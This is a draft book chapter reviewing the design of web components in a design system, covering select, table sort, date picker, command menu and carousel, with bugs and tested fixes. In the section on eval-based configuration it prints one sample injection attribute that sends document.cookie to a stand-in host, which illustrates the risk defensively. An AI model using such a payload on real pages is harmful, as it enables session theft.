# Chapter 5: Complex Components: Select, Table, Date Picker and Command Menu

> **Draft 1.** Code comes from the AS Design System repository. Behaviour described as "tested" was reproduced in jsdom, and proposed fixes were run against the original code. Items marked **[AUTHOR NOTE]** are places for your own story.

---

## Where the difficulty lives

The small components of Chapter 3 are hard to get wrong in interesting ways. The ones in this chapter are different: they hold **state**, they handle the **keyboard**, they **position** floating UI, and they deal with **language and locale**. Each of these four things is where a "simple" widget turns into a few hundred lines.

The components covered here:

| Component | Lines | The hard part |
|---|---|---|
| `as-select` | 250 | A searchable dropdown that must still behave like a `<select>` |
| `as-select-multiple` | 315 | The same with multiple choices |
| `as-table-sort` | 293 | Sorting and filtering an existing table |
| `as-date-picker` | 398 | Calendars, locales, and a mobile fallback |
| `as-command-menu` | 246 | Global shortcuts and a configurable action list |
| `as-search-menu` | 245 | The same pattern, for site search |
| `as-carousel` | 273 | Dragging, inertia, and looping |

Rather than tour each one, this chapter pulls out four patterns that show up repeatedly, and shows where each is done well and where it costs something.

---

## Pattern 1: Enhance, don't replace

The most important design decision in the select is invisible in the finished UI. Here is how you use it:

```html
<as-select>
    <select name="country">
        <option>Poland</option>
        <option>Denmark</option>
    </select>
</as-select>
```

The author writes a **normal `<select>`**. The component wraps it, builds a searchable dropdown on top, and keeps the original `<select>` as the source of truth. When the user picks an option, the component sets the native element's `selectedIndex` and dispatches a real `change` event on it:

```js
this.index = this.select.selectedIndex = e.target.dataset.index
...
this.select.dispatchEvent(new Event('change', { bubbles: true }))
```

Everything downstream keeps working: the value submits with the form, `form.elements.country.value` is correct, other scripts listening for `change` fire, and if JavaScript fails to load the page still has a working `<select>`.

The table sort and the form validation components do the same. `as-table-sort` wraps a regular `<table>`, `as-form-validation` wraps a regular `<input>`, and `as-show-hide-password` wraps a regular password field. A custom element used this way is a **wrapper that adds behaviour**, not a replacement that reimplements the browser.

For a CMS, this is the right default. Editors can write plain HTML, and the enhancement is a layer. The same markup works without the component, which gives you:

- **progressive enhancement** (the page works before and without the script),
- **form compatibility** (nothing to wire into submission),
- **an easy escape hatch** (delete the wrapper tag and you still have a valid form control).

The cost is **synchronisation**. Two copies of the state exist, and they can disagree. The select has to rebuild its option list from the native element every time the dropdown opens:

```js
setBaseOptions() {
    this.options = []
    ;[...this.select.options].forEach((option, index) => {
        this.options.push({ text: option.textContent, value: option.value, index })
    })
}
```

That keeps them consistent, since the component always reads fresh data, but it means the select doesn't notice if code changes the options while the dropdown is closed. Which leads to the next pattern.

---

## Pattern 2: Attributes as commands

A custom element has no built-in way to say "refresh yourself". The system has an answer, used in two places, and it's worth understanding because it's unusual.

Look at the select's `observedAttributes`:

```js
static get observedAttributes() { return ["updated"] }

attributeChangedCallback(name, oldValue, newValue) {
    if (name === 'updated' && oldValue === null) {
        this.broadcastEvent('as-select:updated', ...)
        this.tsSelectWrapper.remove()
        this.tsSelectDropdown.remove()
        this.icon.remove()
        this.init()
        this.removeAttribute('updated')
        this.setSelectTriggerValue()
    }
}
```

The attribute `updated` isn't configuration. It is a **command**. If you add options to the inner `<select>` with JavaScript, you tell the component by setting an attribute:

```js
select.append(new Option('Germany'))
selectElement.setAttribute('updated', '')     // rebuild yourself now
```

The component rebuilds its UI and then **removes the attribute**, so it's ready to be set again. (The icon does the same with `new-name`: set it and the icon re-renders with a different glyph, then the attribute disappears.)

It's a neat trick, because it works from anywhere that can set an attribute, including a CMS script or a framework template, with no reference to the component's JavaScript class. It follows the "attributes in, events out" rule from Chapter 4: even *commands* arrive as attributes.

The trade-offs are real:

- It's **write-only and invisible**: the attribute vanishes, so it can't be inspected and isn't in the markup you read.
- It's **non-obvious**: a method call (`selectElement.refresh()`) is what a developer expects.
- It sets a precedent. The next command needs another magic attribute.

A cleaner design offers both: a public method for developers (`refresh()`), with the attribute as a thin wrapper that calls it. Then the command is discoverable *and* reachable from markup.

**[AUTHOR NOTE: Did you choose attribute commands deliberately because of CMS constraints? That's the justification, and it deserves a sentence.]**

---

## Pattern 3: Floating UI, built on the platform

Dropdowns, date pickers and command menus all *float*: they appear over other content and must be positioned, layered and dismissed correctly. Historically that has meant a lot of JavaScript: positioning maths, click-outside handlers, z-index management, scroll listeners.

These components lean on the platform instead. The select builds its dropdown like this:

```js
this.tsSelectTrigger.setAttribute('popovertarget', this.selectId)
this.tsSelectTrigger.style.setProperty('anchor-name', `--${this.selectId}`)
this.tsSelectDropdown.setAttribute('popover', '')
this.tsSelectDropdown.style.setProperty('position-anchor', `--${this.selectId}`)
```

The Popover API handles opening, top-layer rendering, light dismiss and Escape. CSS anchor positioning attaches the list to the trigger. The date picker follows suit, and the command menu uses `<dialog popover>`.

### The cost nobody sees: global listeners

Floating UI usually still needs a *little* JavaScript, and this is where the select quietly pays for it. In `addEventListeners()`:

```js
const calcEvents = ['resize', 'orientationchange', 'scroll']
calcEvents.forEach(event =>
    window.addEventListener(event, this.calculateSelectDropdownPosition.bind(this))
)
```

Every select on the page adds three global listeners that are **never removed**, and the `scroll` handler calls `getBoundingClientRect()`, which forces layout. A page with twenty selects does twenty layout reads on every scroll event, including selects that are closed or no longer on the page.

The listener exists to keep one value, the dropdown's width, in sync with its trigger. That is a job for a `ResizeObserver` on the trigger, which fires only when the size actually changes and can be disconnected:

```js
connectedCallback() {
    this.ro = new ResizeObserver(() => this.calculateSelectDropdownPosition())
    this.ro.observe(this.tsSelectTrigger)
}
disconnectedCallback() { this.ro.disconnect() }
```

With anchor positioning handling the *placement*, the width is the only thing JavaScript still needs to supply.

**A browser-support note.** Popover is widely supported. Anchor positioning is newer, and support still differs between browsers, so check your own matrix before relying on it. A reasonable plan is a fallback that positions the list with a plain CSS rule in browsers that don't support anchoring.

### Other details worth noticing

- Every option in the dropdown gets `tabindex="0"`, so each one is a separate stop in the tab order. With a long list (a country select, say) keyboard users can tab through hundreds of options. The usual pattern is a single tab stop with arrow-key navigation, and the select *does* implement arrow keys, so the extra tab stops are redundant.
- The element's own `id` is overwritten on every connection: `this.setAttribute('id', crypto.randomUUID())`. An author-supplied `id` is lost, and after moving the element its `id` no longer matches the one used by the dropdown it created. This is another small sign of the connect-twice problem from Chapter 3.
- The `options` field holds an array of objects at one moment and a `NodeList` of `<li>` elements at the next. Reusing a field for two shapes makes code hard to follow, and it is a classic source of bugs.

---

## Pattern 4: Language and locale

Two components handle language in two different ways, one good and one with a serious problem.

### The date picker: let `Intl` do it

Month names and weekday labels aren't hard-coded in a table. They are computed:

```js
option.text = new Date(2000, m - 1, 1).toLocaleString(this.locale, { month: 'long' })
weekday.textContent = new Intl.DateTimeFormat(this.locale, { weekday: "narrow" }).format(new Date(2023, 7, i))
```

Set `locale="pl"` and the calendar speaks Polish, with correct month names. Set `locale="da"` and it's Danish. There's no translation table to maintain, and every locale the browser supports is available for free. Whenever you're about to write an array of month names, stop and reach for `Intl`.

The date picker also does something sensible on small screens. Below a configurable `breakpoint` it switches its input to the native control:

```js
if (window.innerWidth < this.breakpoint) {
    this.input.setAttribute('type', 'date')
    ...
} else {
    this.input.setAttribute('type', 'text')
}
```

Phones already have an excellent date picker, so on touch devices the component steps aside and uses it. That's the "enhance, don't replace" principle applied at runtime. (One note: it listens to `window.resize` to decide, and never removes that listener, the same leak pattern as before.)

### The table sort: comparing strings the wrong way

Here the system's own audience matters. Sorting is where locale bites hardest, and the table sort compares text like this:

```js
if (valA < valB) return asc ? -1 : 1
if (valA > valB) return asc ? 1 : -1
```

The `<` operator on strings compares **UTF-16 code units**, not words as humans order them. I ran the component against four names and clicked the Name header twice:

```
initial:   Łukasz, Zofia, apple, Adam
click 1:   Łukasz, apple, Zofia, Adam      (descending, code-unit order)
click 2:   Adam, Zofia, apple, Łukasz      (ascending, code-unit order)
```

Two separate problems show up:

1. **Code-unit order is wrong for language.** All uppercase letters sort before all lowercase ones (so `Zofia` comes before `apple`), and `Ł` sorts after everything, because its code point is larger than `z`'s. Polish, Danish, German and Swedish names are all misordered.
2. **The first click sorts descending.** The column's direction flag starts `true`, and the sort handler flips it (`!asc`) before using it. So the first click produces descending order, which contradicts the comment in `resetDir()`: "always sorts ASC when clicked first time".

Both fixes are small. Use `Intl.Collator`, which knows the rules of each language and can compare numbers naturally, and initialise the flag to `false`:

```js
const collator = new Intl.Collator(
    this.getAttribute('locale') || document.documentElement.lang || undefined,
    { numeric: true, sensitivity: 'base' })

this.sortedRows = rows.sort((a, b) => {
    const r = collator.compare(a.cells[index].innerText.trim(),
                               b.cells[index].innerText.trim())
    return asc ? r : -r
})
```

I applied that patch (plus changing the flag's two initial values from `true` to `false`) and re-ran the same test with `lang="pl"`:

```
click 1 name:  Adam, apple, Łukasz, Zofia      (ascending, Polish order)
click 2 name:  Zofia, Łukasz, apple, Adam      (descending)
click 1 qty:   2, 4, 10, 33                    (numeric, ascending)
click 2 qty:   33, 10, 4, 2
```

The collator also removed the need for the separate `isNumber` branch, since `numeric: true` sorts `2` before `10` without converting anything.

**[AUTHOR NOTE: You work in Polish, so this one is yours. A short, true story about a Polish name or word sorting wrongly would make a strong sidebar.]**

One design point is worth keeping. The sort re-orders the **existing `<tr>` nodes** instead of re-creating them, so anything attached to a row (event listeners, an open popout in the actions column, an input's value) survives a sort. That's the right call, and it's the reason the component can live inside an interactive table.

---

## Pattern 5: Configuration that can run code

The command menu is the system's most ambitious component. It opens with a keyboard shortcut (`Meta+K` by default), shows a searchable list of actions grouped into sections, supports per-action shortcuts, and can be dragged around. Its strings are all externalised into a `locale` object, so the same component can be Danish, Polish or English without touching its code. That is excellent design.

Its configuration, though, shows a risk worth a full discussion.

### The eval problem

```js
this.locale  = eval(this.getAttribute('locale'))
this.options = eval(this.getAttribute('options') || [])
```

The attributes don't contain data. They contain the **name of a global variable**, which `eval()` resolves:

```html
<as-command-menu locale="locale" options="options" keys="Meta+K"></as-command-menu>
```

```js
// somewhere else on the page
const locale  = { navigate: "Navigate", select: "Select", ... }
const options = [{ title: "Mine aftaler", shortcut: "Alt+A", handler: () => {...} }]
```

The reason is understandable. Options include **functions** (`handler`), and an attribute is a string, so there's no direct way to pass a function. Using `eval` on a variable name is a way round that.

But `eval(attributeValue)` executes whatever the attribute contains. If any part of that attribute can be influenced by someone other than the developer (a CMS field, a URL parameter echoed into the page, a user-generated block), it becomes a **code injection** path:

```html
<as-command-menu options="fetch('//evil.example/?c='+document.cookie)"></as-command-menu>
```

It also blocks a strict **Content Security Policy**. Sites that forbid `unsafe-eval` can't run this component at all.

### A safer shape

The underlying need is "configure with data and functions". Neither requires `eval`. Data can be a JSON block or a JavaScript property, and functions can be replaced by **events**. I wrote and tested this pattern:

```html
<script type="application/json" id="cmd-options">
  [{ "title": "My tasks", "section": "Cases", "shortcut": "Alt+O", "action": "open-tasks" }]
</script>
<as-command-menu options-from="#cmd-options"></as-command-menu>
```

```js
class ASCommandMenu extends HTMLElement {
    #options = []
    set options(list) { this.#options = Array.isArray(list) ? list : []; this.render() }
    get options()     { return this.#options }

    connectedCallback() {
        const sel = this.getAttribute('options-from')
        if (sel && !this.#options.length) {
            try { this.options = JSON.parse(document.querySelector(sel).textContent) }
            catch { this.options = [] }
        }
        this.render()
    }

    render() {
        this.replaceChildren(...this.#options.map(o => {
            const a = document.createElement('a')
            a.textContent = o.title
            a.href = '#'
            a.addEventListener('click', e => {
                e.preventDefault()
                this.dispatchEvent(new CustomEvent('as-command-menu:run',
                    { bubbles: true, detail: { action: o.action } }))
            })
            return a
        }))
    }
}
```

The page then handles the actions the same way it handles every other event in the system:

```js
document.addEventListener('as-command-menu:run', e => {
    if (e.detail.action === 'open-tasks') openTasks()
})
```

In my test, a JSON block rendered one link, a click delivered `open-tasks` to a `document` listener, setting `.options` from JavaScript re-rendered the list, and malformed JSON degraded to an empty menu rather than throwing. There is no `eval` anywhere, and the component never has to know what any action does.

This is the design the rest of the system already points to. Chapter 4 argued that events are the output contract, so actions-as-events is just that contract applied to menu items.

### Other issues in the same file

- **No idempotency guard.** `connectedCallback` calls `init()`, `render()`, `registerKeys()` and others unconditionally. Moving the element registers a second set of `document` keydown listeners, and none are ever removed (`disconnectedCallback` doesn't exist). The same applies to the drag handlers on `pointermove` and `pointerup`.
- **Escape toggles.** The handler calls `this.btns.menu.click()` when Escape is pressed. That's a *toggle* button, and the handler can't tell whether the menu is open, so what Escape does depends on state that the code doesn't check.
- **A missing attribute crashes it.** `this.getAttribute('keys').split('+') || ["Meta", "K"]` is meant to fall back to Meta+K, but `getAttribute` returns `null` when the attribute is absent, and `null.split` throws before the fallback can apply. The `||` can never run.
- **Case-sensitive title match.** Filtering checks `option.title.includes(searchText)` without lower-casing the title, so typing "mine" won't match "Mine aftaler" through the title (it relies on the separate `keywords` string).
- **Typed OM dependency.** The drag code clears styles with `attributeStyleMap.delete(...)`, part of the CSS Typed Object Model, which isn't available in every browser. Check support, or use `style.removeProperty`.

---

## The model citizen: the carousel

Not everything here is a cautionary tale. The carousel is the system's best example of lifecycle discipline. It stores each bound handler once and removes all of them on disconnect:

```js
this._onResize = this.resize.bind(this)
this._onPointerMove = this.dragAction.bind(this)
...
disconnectedCallback() {
    window.removeEventListener('resize', this._onResize)
    document.removeEventListener('pointermove', this._onPointerMove)
    document.removeEventListener('pointerup', this._onPointerUp)
    this.sliderRoot.removeEventListener('wheel', this._onWheel)
    cancelAnimationFrame(this.inertiaFrame)
    clearInterval(this.rotateInterval)
    clearTimeout(this.autostart)
}
```

This is the first cleanup pattern from Chapter 3 (store the bound function so you can remove the same function), applied completely. It covers listeners on `window` and `document`, an animation frame, an interval and a timeout. It also reads its numeric settings with `Number(...)` and falls back to sensible defaults, and it reacts to attribute changes via `observedAttributes` (`gap`, `delay`, `speed`).

Its drag behaviour adds inertia and velocity-based snapping, which makes it feel physical. If you want to see how much code real touch interaction takes, read `dragStart`, `dragAction`, `dragEnd`, `applyInertia` and `snapWithVelocity` together.

One thing to watch: the carousel begins `connectedCallback` with `const content = this.innerHTML` and then wraps that content in new markup. That is the same read-then-rewrite pattern as the drawer in Chapter 3, so it carries the same risk of nesting if the element is moved. I haven't tested it (the component needs real layout measurements that jsdom can't provide), so treat that as a lead to check in a browser rather than a confirmed bug.

---

## A note on the search menu's storage

`as-search-menu` remembers recent searches in `localStorage`:

```js
this.recentSearches = JSON.parse(localStorage.getItem('asRecentSearches')) || []
```

Three things to consider when a component persists user data:

1. **The key is global.** Every instance on the same origin shares `asRecentSearches`, so two search boxes will mix their histories.
2. **The parse is unguarded.** If the stored value is corrupt, or storage access is blocked (some privacy settings throw on access), the component throws while connecting. Wrap storage access in `try/catch`.
3. **It's user data.** Search terms can be personal. A system used across many sites should offer a way to turn persistence off, and say that it exists in the documentation.

---

## Try it

1. **Fix the sort.** Apply the collator patch to `as-table-sort`, and add a `lang="pl"` row with `Ł` to the demo table. Does `Łukasz` land between `apple` and `Zofia`?
2. **Remove `eval`.** Convert the command menu to the JSON-plus-events pattern, then add a CSP header (`script-src 'self'`) to your dev server and check the menu still works.
3. **Count the listeners.** Put 20 `<as-select>` elements on a page. In dev tools, use `getEventListeners(window)` to count the `scroll` handlers, then replace them with a `ResizeObserver` and count again.
4. **Move test.** Move a command menu with `append()` and press `Meta+K`. How many times does it fire?

---

## Chapter summary

- **Enhance, don't replace.** `as-select`, `as-table-sort` and `as-form-validation` wrap native elements, keeping forms, fallbacks and CMS authoring simple. The price is keeping two copies of state in sync.
- **Attributes can be commands** (`updated`, `new-name`), which works from markup but is invisible and non-obvious. Pair them with a public method.
- **Floating UI belongs to the platform** (Popover, anchor positioning), and what JavaScript remains should use `ResizeObserver` instead of per-instance `scroll` listeners.
- **Let `Intl` handle language.** The date picker does, and the table sort should: `<` on strings misorders Polish, Danish and German text, and the first click sorts the wrong way.
- **Never `eval` configuration.** Pass data as JSON or properties, and pass behaviour out through events.
- **The carousel is the model for cleanup**, and every component with global listeners should look like it.

**Next:** Chapter 6 is a deep dive into the biggest single file in the system, the 945-line graph component, to see how a charting library is built from SVG, attributes and a few hundred lines of geometry.
